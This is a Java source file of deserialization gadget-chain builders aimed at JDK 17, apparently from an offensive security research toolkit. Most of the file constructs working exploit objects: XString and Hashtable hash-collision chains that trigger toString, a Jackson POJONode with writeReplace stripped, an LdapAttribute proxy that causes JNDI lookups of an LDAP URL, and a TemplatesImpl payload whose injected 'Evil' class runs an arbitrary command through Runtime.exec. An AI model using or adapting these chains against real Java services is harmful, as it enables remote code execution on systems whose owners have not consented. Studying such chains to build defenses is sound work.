package cn.org.unk;

import cn.org.unk.test.TestGetter;
import cn.org.unk.test.TestToString;
import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;
import org.springframework.aop.framework.AdvisedSupport;
import sun.reflect.ReflectionFactory;

import javax.naming.CompositeName;
import javax.naming.directory.Attribute;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.Vector;

public class Gadget17 {




    /*
    make map1's hashCode == map2's
    map3#readObject
        map3#put(map1,1)
        map3#put(map2,2)
            if map1's hashCode == map2's :
                map2#equals(map1)
                    map2.xString#equals(obj) // obj = map1.get(zZ)
                        obj.toString
     */
    public static HashMap get_HashMap_XString(Object obj) throws Exception{
        Object xString = Util17.createWithoutConstructor(Class.forName("com.sun.org.apache.xpath.internal.objects.XString"));
        Util17.setFieldValue(xString,"m_obj",obj);
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", xString);
        map1.put("zZ",obj);
        map2.put("zZ", xString);
        HashMap map3 = new HashMap();
        map3.put(map1,1);
        map3.put(map2,2);

        map2.put("yy", obj);
        return map3;
    }

    public static POJONode getPOJONode(Object val){
        try {

            // SecurityActions 里面有一个 setAccessible 操作
            UnsafeTools.bypassModule(Class.forName("javassist.util.proxy.SecurityActions"));

            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new POJONode(val);
    }

    public static Object getLDAPAttribute(String ldapUrl) throws Exception{
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Object ldapAttribute = Util17.createWithoutConstructor(ldapAttributeClazz);
        Util17.setFieldValue(ldapAttribute,"attrID","name");
        Util17.setFieldValue(ldapAttribute,"baseCtxURL",ldapUrl);
        Util17.setFieldValue(ldapAttribute,"rdn", new CompositeName("a//b"));
        return ldapAttribute;
    }

    public static Object getLDAPAttributeProxy(String ldapUrl) throws Exception{
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(getLDAPAttribute(ldapUrl));
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Attribute.class}, handler);
        return proxyObj;
    }


    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector)Util17.getFieldValue(manager, "edits");
        vector.add(obj);
        Util17.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }

    public static Object getFastJsonArray(Object obj){
        JSONArray jsonArray0 = new JSONArray();
        jsonArray0.add(obj);
        return jsonArray0;
    }


    public static Object getTestToString(){
        return new TestToString("");
    }

    public static Object getTestGetter(){
        return new TestGetter();
    }

    public static void main(String[] args) throws Exception{


    }

    /*
        https://www.aiwin.fun/index.php/archives/4420/

        hashtable#readObject
            hashtable#reconstitutionPut
                AbstractMap#equals
                    TextAndMnemonicHashMap.get
                        obj.toString
     */
    public static Hashtable getTextAndMnemonicHashMap(Object o) throws Exception{
        Map tHashMap1 = (HashMap) Util17.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (HashMap) Util17.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        Util17.setFieldValue(tHashMap1,"loadFactor",1);
        Util17.setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }

    public static Object getTemplatesImpl(byte[] bytes) throws Exception {
        Object templates = Util17.createWithoutConstructor(Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"));
        Object transformerFactoryImpl = Util17.createWithoutConstructor(Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"));

        ClassPool pool = ClassPool.getDefault();
        byte[] foo = pool.makeClass("Foo").toBytecode();

        Util17.setFieldValue(templates, "_name", "whatever");
        Util17.setFieldValue(templates, "_sdom", new ThreadLocal());
        Util17.setFieldValue(templates, "_tfactory", transformerFactoryImpl);
        Util17.setFieldValue(templates, "_bytecodes",  new byte[][] {bytes, foo});

        return getJdkDynamicAopProxy(templates);
    }
    public static Object getTemplatesImpl(String cmd) throws Exception{

        // SecurityActions 里有 setAccessible 操作
        UnsafeTools.bypassModule(Class.forName("javassist.util.proxy.SecurityActions"));

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.addConstructor(
                CtNewConstructor.make("public Evil() {"+
                                "Runtime.getRuntime().exec(\"" + cmd + "\"); }"
                        , ctClass)
        );

        byte[] bytecode = ctClass.toBytecode();
        return getTemplatesImpl(bytecode);
    }
    private static Object getJdkDynamicAopProxy(Object templatesImpl) throws Exception{
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        return Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
    }

}
